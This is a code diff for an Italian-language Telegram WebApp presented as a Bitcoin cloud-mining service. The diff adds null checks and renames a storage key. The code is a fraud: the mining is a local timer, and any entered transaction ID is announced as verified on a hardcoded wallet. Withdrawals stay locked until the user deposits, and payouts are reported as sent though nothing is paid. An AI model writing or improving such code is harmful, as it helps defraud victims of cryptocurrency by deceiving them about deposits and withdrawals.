@@ -550,7 +550,7 @@
     const tg = window.Telegram ? window.Telegram.WebApp : null;
     if (tg) { try { tg.expand(); tg.ready(); } catch(e) {} }
 
-    let appData = JSON.parse(localStorage.getItem('satoshi_stable_app_v2')) || {
+    let appData = JSON.parse(localStorage.getItem('satoshi_safe_app_v3')) || {
       score: 0.00000000,
       deposit: 0.00,
       hashrate: 0,
@@ -564,7 +564,9 @@
     const TWELVE_HOURS = 12 * 60 * 60 * 1000;
 
     function saveData() {
-      localStorage.setItem('satoshi_stable_app_v2', JSON.stringify(appData));
+      try {
+        localStorage.setItem('satoshi_safe_app_v3', JSON.stringify(appData));
+      } catch (e) {}
     }
 
     async function fetchBtcPrice() {
@@ -579,23 +581,34 @@
     }
 
     function updateUI() {
-      document.getElementById('user-score').innerText = Number(appData.score).toFixed(8);
-      let usdVal = (appData.score / 100000000) * currentBtcPrice;
-      document.getElementById('fiat-val').innerText = `Valore stimato: ~$${usdVal.toFixed(6)} USD`;
-      document.getElementById('btc-live-price').innerText = `Prezzo BTC Live: ~$${currentBtcPrice.toLocaleString()} USD`;
-      document.getElementById('usdt-dep').innerText = Number(appData.deposit).toFixed(2);
-      document.getElementById('wallet-dep').innerText = `${Number(appData.deposit).toFixed(2)} USDT`;
-      
-      let displayPower = appData.hashrate >= 1000 ? (appData.hashrate / 1000).toFixed(1) + ' TH/s' : appData.hashrate + ' GH/s';
-      document.getElementById('user-hashrate').innerText = displayPower;
-
+      const elScore = document.getElementById('user-score');
+      const elFiat = document.getElementById('fiat-val');
+      const elBtcPrice = document.getElementById('btc-live-price');
+      const elUsdtDep = document.getElementById('usdt-dep');
+      const elWalletDep = document.getElementById('wallet-dep');
+      const elHashrate = document.getElementById('user-hashrate');
       const statusLbl = document.getElementById('withdraw-status-label');
-      if (appData.deposit >= 3.00) {
-        statusLbl.innerText = "Sbloccato ✅";
-        statusLbl.style.color = "#34d399";
-      } else {
-        statusLbl.innerText = "Bloccato (< 3 USDT)";
-        statusLbl.style.color = "#ef4444";
+
+      if (elScore) elScore.innerText = Number(appData.score || 0).toFixed(8);
+      
+      let usdVal = ((appData.score || 0) / 100000000) * currentBtcPrice;
+      if (elFiat) elFiat.innerText = `Valore stimato: ~$${usdVal.toFixed(6)} USD`;
+      if (elBtcPrice) elBtcPrice.innerText = `Prezzo BTC Live: ~$${currentBtcPrice.toLocaleString()} USD`;
+      if (elUsdtDep) elUsdtDep.innerText = Number(appData.deposit || 0).toFixed(2);
+      if (elWalletDep) elWalletDep.innerText = `${Number(appData.deposit || 0).toFixed(2)} USDT`;
+      
+      let hr = appData.hashrate || 0;
+      let displayPower = hr >= 1000 ? (hr / 1000).toFixed(1) + ' TH/s' : hr + ' GH/s';
+      if (elHashrate) elHashrate.innerText = displayPower;
+
+      if (statusLbl) {
+        if ((appData.deposit || 0) >= 3.00) {
+          statusLbl.innerText = "Sbloccato ✅";
+          statusLbl.style.color = "#34d399";
+        } else {
+          statusLbl.innerText = "Bloccato (< 3 USDT)";
+          statusLbl.style.color = "#ef4444";
+        }
       }
 
       checkMiningProgress();
@@ -616,7 +629,7 @@
         const elapsed = now - appData.miningStartTime;
         const progress = Math.min(elapsed / totalDuration, 1);
 
-        appData.score = Number((appData.targetScore * progress).toFixed(8));
+        appData.score = Number(((appData.targetScore || 0) * progress).toFixed(8));
         saveData();
 
         const remaining = Math.ceil((appData.miningEndTime - now) / 1000);
@@ -625,7 +638,7 @@
         const s = remaining % 60;
         alertBox.innerText = `⏳ Sessione 12h in corso. Completamento tra: ${h}h ${m}m ${s}s`;
       } else {
-        if (appData.miningEndTime !== 0 && appData.score < appData.targetScore) {
+        if (appData.miningEndTime !== 0 && appData.score < (appData.targetScore || 0)) {
           appData.score = appData.targetScore;
           saveData();
         }
@@ -642,36 +655,41 @@
       appData.miningEndTime = now + TWELVE_HOURS;
 
       let baseReward = 0.50000000; 
-      let powerBonus = (appData.hashrate / 500) * 0.10000000; 
+      let powerBonus = ((appData.hashrate || 0) / 500) * 0.10000000; 
       let totalSessionReward = baseReward + powerBonus;
 
-      appData.targetScore = Number((appData.score + totalSessionReward).toFixed(8));
+      appData.targetScore = Number(((appData.score || 0) + totalSessionReward).toFixed(8));
       saveData();
       updateUI();
       alert("Sessione di mining avviata! La potenza di calcolo sta generando Satoshi.");
     }
 
     function buyHashratePackage(ghPower, powerName, usdtPrice) {
-      appData.deposit = Number((appData.deposit + usdtPrice).toFixed(2));
-      appData.hashrate += ghPower; 
+      appData.deposit = Number(((appData.deposit || 0) + usdtPrice).toFixed(2));
+      appData.hashrate = (appData.hashrate || 0) + ghPower; 
       saveData();
       updateUI();
       alert(`Rig (${powerName}) acquistato con successo! Potenza aggiunta al cloud rig.`);
     }
 
     function submitDeposit() {
-      let txid = document.getElementById('txid-input').value;
+      const txInput = document.getElementById('txid-input');
+      let txid = txInput ? txInput.value : '';
       if (!txid) { alert("Inserisci il TXID della transazione Bitcoin."); return; }
-      appData.deposit = Number((appData.deposit + 10.00).toFixed(2));
+      
+      appData.deposit = Number(((appData.deposit || 0) + 10.00).toFixed(2));
       saveData();
       updateUI();
       alert("Transazione verificata sul wallet 1M2xeN5edX8xjQnXar74dseBdivuLLoSzt! Prelievi sbloccati.");
-      document.getElementById('txid-input').value = '';
+      if (txInput) txInput.value = '';
     }
 
     function requestWithdrawal() {
-      let amt = parseFloat(document.getElementById('withdraw-amount').value);
-      let addr = document.getElementById('withdraw-address').value;
+      const amtInput = document.getElementById('withdraw-amount');
+      const addrInput = document.getElementById('withdraw-address');
+
+      let amt = amtInput ? parseFloat(amtInput.value) : 0;
+      let addr = addrInput ? addrInput.value : '';
       
       if (!addr || isNaN(amt) || amt <= 0) { 
         alert("Inserisci dati di prelievo validi."); 
@@ -683,24 +701,24 @@
         return;
       }
 
-      if (appData.deposit < 3.00) {
+      if ((appData.deposit || 0) < 3.00) {
         alert("Prelievo bloccato! È richiesto un versamento minimo sul tuo wallet Bitcoin per sbloccare i pagamenti.");
         switchTab('ricarica', document.querySelectorAll('.nav-item')[3]);
         return;
       }
 
-      if (amt > appData.score) { 
+      if (amt > (appData.score || 0)) { 
         alert("Saldo Satoshi insufficiente."); 
         return; 
       }
 
-      appData.score = Number((appData.score - amt).toFixed(8));
-      appData.targetScore = Number((appData.targetScore - amt).toFixed(8));
+      appData.score = Number(((appData.score || 0) - amt).toFixed(8));
+      appData.targetScore = Number(((appData.targetScore || 0) - amt).toFixed(8));
       if (appData.targetScore < 0) appData.targetScore = 0;
       saveData();
       updateUI();
       alert("Prelievo inviato con successo!");
-      document.getElementById('withdraw-amount').value = '';
+      if (amtInput) amtInput.value = '';
     }
 
     setInterval(() => {
@@ -710,6 +728,7 @@
     function switchTab(tabName, element) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
       document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      
       const targetScreen = document.getElementById(`screen-${tabName}`);
       if (targetScreen) targetScreen.classList.add('active');
       if (element) element.classList.add('active');
